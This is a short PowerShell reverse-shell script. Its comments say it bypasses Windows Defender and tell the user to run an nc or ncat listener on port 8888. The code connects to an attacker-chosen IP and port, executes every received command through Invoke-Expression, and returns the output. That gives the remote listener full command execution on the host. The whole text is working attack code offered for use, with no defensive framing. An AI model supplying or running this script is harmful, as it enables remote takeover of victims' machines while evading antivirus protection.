#script will bypass defender - run in powershell and update port/IP to receive reverse shell. 
#on your listener run nc -lv 8888 (for MacOS) or if on windows ncat -lvnp 8888 
#Remember to update port #number to match port set in script)
#Virtually no obfuscation - still undetected! 


$h='{change to your IP}';$p={change to your port}
$a=New-Object Net.Sockets.TCPClient($h,$p)
$s=$a.GetStream()
$b=New-Object Byte[] 65535
$e=New-Object Text.ASCIIEncoding
while(($i=$s.Read($b,0,$b.Length)) -ne 0){
  $d=$e.GetString($b,0,$i).Trim()
  if (![string]::IsNullOrWhiteSpace($d)) {
    $r=(Invoke-Expression $d 2>&1 | Out-String)
    $r2=$r+"`nPS "+(pwd).Path+"> "
    $sb=$e.GetBytes($r2)
    $s.Write($sb,0,$sb.Length)
    $s.Flush()
  }
}
